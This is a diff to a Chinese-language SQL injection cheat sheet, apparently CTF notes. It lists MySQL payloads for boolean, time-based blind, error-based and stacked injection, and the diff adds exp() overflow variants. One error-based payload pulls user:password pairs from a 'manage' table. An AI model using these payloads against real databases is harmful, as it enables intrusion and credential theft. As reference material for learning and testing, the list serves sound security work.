@@ -1,8 +1,9 @@
-- # 布尔回显注入
+# 布尔回显注入
 	- `where id=1 and 1=1`
 	- `where id=1!=2!=(database()regexp('.'))!=0`
 	- `1&&((select 1,'z')>(select * from f1ag_1s_h3r3_hhhhh))`
 	- `if(length(database())<0, '1', ST_X('willerror'))`
+	- `exp(710-（1>1))`
 - # 布尔无回显注入
 	- `where id=1 and if(length(database())>5, sleep(2), 1)`
 - # 报错注入
@@ -12,6 +13,7 @@
 	- `where id=updatexml(1,concat(0x7e,0x61,0x7e),1)#`
 	- `') or gtid_subset(concat(0x7e,(SELECT GROUP_CONCAT(user,':',password) from manage),0x7e),1)--+`
 	- `select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);`
+	- `exp(710)`
 - # 堆叠注入
 	- where id=1; show tables;
 -
